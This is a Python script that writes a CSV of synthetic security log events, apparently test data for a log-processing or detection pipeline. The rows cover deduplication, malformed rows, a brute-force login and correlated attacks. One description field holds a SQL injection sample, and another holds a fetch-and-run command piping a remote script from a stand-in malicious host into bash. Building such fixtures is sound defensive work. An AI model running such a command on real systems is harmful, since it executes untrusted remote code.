import csv
from pathlib import Path

def generate_test_suite_file(output_path: Path):
    output_path.parent.mkdir(parents=True, exist_ok=True)
    
    headers = [
        "event_id_unique", "timestamp", "log_source", "event_id", "event_type",
        "severity", "action", "username", "source_ip", "destination_ip",
        "source_port", "destination_port", "protocol", "hostname", "device_type",
        "department", "country", "session_id", "correlation_id", "process_name",
        "file_name", "file_hash", "bytes_sent", "bytes_received", "response_code",
        "description", "status"
    ]

    rows = [
        # 1. Normal Firewall allowed connection
        ["TEST-001", "2026-04-10 08:00:15", "Firewall", "FW-001", "Network Connection", "Low", "Allowed", "-", "192.168.1.100", "8.8.8.8", "54321", "53", "UDP", "FIREWALL-01", "Firewall", "IT", "US", "SES-01", "INC-TEST-01", "-", "-", "-", "120", "450", "200", "DNS resolution allowed", "Logged"],
        # 2. Exact Duplicate of Row 1 (Tests Exact Deduplication)
        ["TEST-001-DUP", "2026-04-10 08:00:15", "Firewall", "FW-001", "Network Connection", "Low", "Allowed", "-", "192.168.1.100", "8.8.8.8", "54321", "53", "UDP", "FIREWALL-01", "Firewall", "IT", "US", "SES-01", "INC-TEST-01", "-", "-", "-", "120", "450", "200", "DNS resolution allowed", "Logged"],
        # 3. Burst duplicate within 2 seconds (Tests Window Deduplication)
        ["TEST-002", "2026-04-10 08:00:17", "Firewall", "FW-001", "Firewall Filter", "Low", "Allowed", "-", "192.168.1.100", "8.8.8.8", "54322", "53", "UDP", "FIREWALL-01", "Firewall", "IT", "US", "SES-01", "INC-TEST-01", "-", "-", "-", "120", "450", "200", "DNS burst packet", "Logged"],
        # 4. Malformed Row: missing timestamp (Tests row-level error reporting)
        ["TEST-BAD-01", "", "Windows", "4624", "Authentication", "Low", "Success", "admin", "10.0.0.5", "10.0.0.1", "51234", "80", "TCP", "DC-01", "Domain Controller", "IT", "US", "SES-02", "INC-TEST-02", "-", "-", "-", "", "", "", "Login without timestamp", "Logged"],
        # 5. Malformed Row: corrupt unparseable date
        ["TEST-BAD-02", "CORRUPT-DATE-XYZ", "Linux", "SYS-001", "System", "High", "Failed", "root", "10.0.0.6", "10.0.0.1", "22", "22", "TCP", "SRV-01", "Server", "Ops", "US", "SES-03", "INC-TEST-02", "-", "-", "-", "", "", "", "Corrupt date format line", "Logged"],
        # 6. Windows Brute Force Failed Login
        ["TEST-003", "2026-04-10 08:05:22", "Windows", "4625", "Authentication", "High", "Failed", "admin", "203.0.113.45", "192.168.1.50", "49152", "445", "TCP", "DC-01", "Domain Controller", "IT", "US", "SES-BRUTE-01", "INC-CORR-ALPHA", "svchost.exe", "-", "-", "0", "0", "401", "Failed login for account admin from external IP", "Alerted"],
        # 7. Correlated Firewall Block for same attacker IP
        ["TEST-004", "2026-04-10 08:05:45", "Firewall", "FW-002", "Firewall Filter", "High", "Blocked", "-", "203.0.113.45", "192.168.1.50", "49153", "3389", "TCP", "FIREWALL-01", "Firewall", "IT", "US", "SES-BRUTE-02", "INC-CORR-ALPHA", "-", "-", "-", "0", "0", "DROP", "Firewall blocked RDP probe from 203.0.113.45:49153 to 192.168.1.50:3389", "Alerted"],
        # 8. Web Application SQL Injection Attack
        ["TEST-005", "2026-04-10 08:12:10", "Application", "APP-SQLI", "Web Application Attack", "Critical", "Blocked", "attacker", "198.51.100.22", "10.0.0.10", "41235", "443", "HTTPS", "WEB-01", "Application Server", "Dev", "US", "SES-SQLI-01", "INC-CORR-BETA", "nginx", "payload.php", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "14500", "200", "403", "SQL Injection attempt detected: SELECT * FROM users WHERE '1'='1' and external call to malicious.com/payload.sh", "Investigating"],
        # 9. Linux Suspicious Process Execution
        ["TEST-006", "2026-04-10 08:15:30", "Linux", "SYS-AUDIT", "Process Execution", "Critical", "Executed", "root", "198.51.100.22", "10.0.0.10", "55122", "22", "SSH", "LINUX-SERVER-01", "Linux Server", "Engineering", "US", "SES-SQLI-02", "INC-CORR-BETA", "bash", "payload.sh", "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0", "850", "1200", "0", "Command execution detected: curl http://malicious.com/payload.sh | bash", "Critical"]
    ]

    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(headers)
        writer.writerows(rows)
